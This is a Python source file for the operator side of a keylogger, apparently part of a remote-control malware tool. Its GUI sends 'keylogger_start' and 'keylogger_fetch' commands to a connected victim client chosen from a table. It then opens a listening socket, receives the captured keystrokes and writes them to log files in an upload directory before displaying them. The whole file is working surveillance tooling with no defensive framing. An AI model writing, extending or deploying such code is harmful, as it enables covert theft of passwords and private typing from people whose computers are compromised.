__author__ = 'Administrator'

from PySide.QtGui import *
from PySide.QtCore import Slot,QTime,SIGNAL
import socket
import thread

###################################################################################

class GUI_keylogger:

    host = ''
    port = 0
    port_suffix = '2348'
    tmp_buffer = ''


    def __init__(self):

        f = open('server.config','r')
        self.host = f.readline().split('=')[1].rstrip()
        f.close()


    
    def openDialog(self,frame,c,tableWidget):

        self.c = c
        self.tableWidget = tableWidget
        #dialog
        self.dialog = QDialog(frame)
        self.dialog.setWindowTitle('Keylogger')
        self.dialog.setMinimumSize(600,300)

        
        vlayout = QVBoxLayout()
        self.tout = QTextEdit()
        self.tout.setMinimumHeight(250)
        self.tout.setReadOnly(True)
        self.tout.setLineWrapMode(QTextEdit.FixedPixelWidth)
        vlayout.addWidget(self.tout)

        hlayout = QHBoxLayout()
        btn = QPushButton('Start service')
        btn.clicked.connect(self.start_service)
        btn.setMaximumHeight(40)
        hlayout.addWidget(btn)
        #btn2
        btn = QPushButton('Fetch')
        btn.clicked.connect(self.fetchData)
        btn.setMaximumHeight(40)
        hlayout.addWidget(btn)
        vlayout.addLayout(hlayout)

        #show
        self.dialog.setLayout(vlayout)
        self.dialog.exec_()


    def fetchData(self):

        row = self.tableWidget.selectedIndexes()[0].row() + 1
        self.port = int(str(row) + self.port_suffix)  
        self.c.send('exec keylogger_fetch:'+str(self.port))
        
        sf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
        sf.bind((self.host, self.port))        
        sf.listen(5)
        
        cf, addr = sf.accept() 
        #write output in upload_dir
        
        data = cf.recv(1024)
        f = open('upload_dir//keylogs_'+str(self.port)+'.txt',"wb")
        while data:
            #print data
            f.write(data)
            data = cf.recv(1024)
        cf.close()
            
        self.tout.clear()
        print 'debug'
        f = open('upload_dir//keylogs_'+str(self.port)+'.txt',"r")
        for line in f:
            print line
            self.tout.append(line)
        f.close()


    def start_service(self):
        
         self.c.send('exec keylogger_start:0')
         row = self.tableWidget.selectedIndexes()[0].row()
         self.tableWidget.setItem(row,5,QTableWidgetItem(str('Started')))
         self.tableWidget.item(row, 5).setBackground(QColor(0,255,0))
            


